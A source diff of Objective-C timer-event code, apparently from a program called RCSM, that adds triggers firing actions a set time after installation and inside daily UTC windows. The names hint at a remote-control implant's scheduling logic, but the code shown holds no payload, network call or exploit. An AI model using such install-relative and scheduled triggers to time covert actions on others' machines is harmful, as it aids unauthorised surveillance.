@@ -128,6 +128,9 @@ NSLock *connectionLock;
 - (void)eventTimer: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  BOOL timerDailyTriggered = NO;
+  
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
 
   [configuration retain];
@@ -136,16 +139,6 @@ NSLock *connectionLock;
   NSDate *startThreadDate = [[NSDate date] retain];
   NSTimeInterval interval = 0;
   
-#ifdef DEBUG_EVENTS
-  timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
-  
-  int ty  = timerRawData->type;
-  uint lo = timerRawData->loDelay;
-  
-  infoLog(@"type (%d) - low (%d)", ty, lo / 1000);
-  infoLog(@"type (%d) - startDate (%@)", ty, startThreadDate);
-#endif
-
   while ([configuration objectForKey: @"status"] != EVENT_STOP &&
          [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
@@ -157,6 +150,7 @@ NSLock *connectionLock;
       int type          = timerRawData->type;
       uint low          = timerRawData->loDelay;
       uint high         = timerRawData->hiDelay;
+      uint endActionID  = timerRawData->endAction;
       
       switch (type)
         {
@@ -183,11 +177,11 @@ NSLock *connectionLock;
         case TIMER_LOOP:
           {
             interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
-            
+
             if (fabs(interval) >= low / 1000)
               {
 #ifdef DEBUG_EVENTS
-                warnLog(@"TIMER_LOOP (%f) triggered", fabs(interval));
+                infoLog(@"TIMER_LOOP (%f) triggered", fabs(interval));
 #endif
                 
                 if (startThreadDate != nil)
@@ -222,8 +216,119 @@ NSLock *connectionLock;
             
             break;
           }
-        case TIMER_DELTA:
+        case TIMER_INST:
           {
+            int64_t configuredDate = 0;
+            // 100-nanosec unit from installation date
+            configuredDate = ((int64_t)high << 32) | (int64_t)low;
+            // seconds unit from installation date
+            configuredDate = configuredDate*(0.0000001);
+    
+            NSDictionary *bundleAttrib =
+            [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
+                                                             error: nil]; 
+            
+            NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
+        
+            if (creationDate == nil)
+              break;
+            
+            NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
+                   
+#ifdef DEBUG_EVENTS
+            infoLog(@"TIMER_DELTA num of seconds %d, creationDate %@, givenDate %@", 
+                    configuredDate, creationDate, givenDate);
+#endif            
+            if ([[NSDate date] isGreaterThan: givenDate])
+            {
+#ifdef DEBUG_EVENTS
+              warnLog(@"TIMER_DELTA (%@) triggered", givenDate);
+#endif
+              [taskManager triggerAction: actionID];
+              
+              [innerPool release];
+              [outerPool release];
+              
+              [NSThread exit];
+            }
+            
+            break;
+          }
+        case TIMER_DAILY:
+          {
+            //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
+            NSDate *now = [NSDate date];
+            
+            NSRange fixedRange;
+            fixedRange.location = 11;
+            fixedRange.length   = 8;
+            
+            // UTC timers
+            NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
+            
+            NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
+            [inFormat setTimeZone:timeZone];
+            [inFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
+            
+            // Get current date string UTC
+            NSString *currDateStr = [inFormat stringFromDate: now];
+            [inFormat release];
+            NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
+            
+#ifdef DEBUG_EVENTS
+            infoLog(@"TIMER_DAILY currDateStr %@ (now %@)", currDateStr, now);
+#endif       
+            // Set current date time to midnight
+            [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
+            
+#ifdef DEBUG_EVENTS
+            infoLog(@"TIMER_DAILY dayStr %@", dayStr);
+#endif  
+            NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
+            [outFormat setTimeZone:timeZone];
+            [outFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
+            
+            // Current midnite
+            NSDate *dayDate = [outFormat dateFromString: dayStr];
+            [outFormat release];
+            
+#ifdef DEBUG_EVENTS
+            infoLog(@"TIMER_DAILY dayDate %@", dayDate);
+#endif   
+            [dayStr release];
+            
+            NSDate *highDay = [dayDate addTimeInterval: (high/1000)];
+            NSDate *lowDay = [dayDate addTimeInterval: (low/1000)];
+            
+#ifdef DEBUG_EVENTS
+            infoLog(@"TIMER_DAILY min %@ max %@ curr %@ endActionID %d", 
+                    lowDay, highDay, [NSDate date], endActionID);
+#endif            
+            
+            if (timerDailyTriggered == NO &&
+                [[now laterDate: lowDay] isEqualToDate: now] &&
+                [[now earlierDate: highDay] isEqualToDate: now])
+            {
+#ifdef DEBUG_EVENTS
+              infoLog(@"TIMER_DAILY actionID triggered");
+#endif
+              [taskManager triggerAction: actionID];
+              
+              timerDailyTriggered = YES;
+              
+            } 
+            else if (timerDailyTriggered == YES && 
+                     ([[now laterDate: highDay] isEqualToDate: now]||
+                      [[now earlierDate: lowDay] isEqualToDate: now] ))
+            {
+#ifdef DEBUG_EVENTS
+              infoLog(@"TIMER_DAILY endActionID triggered");
+#endif
+              [taskManager triggerAction: endActionID];
+              
+              timerDailyTriggered = NO;
+            }
+            
             break;
           }
         default:
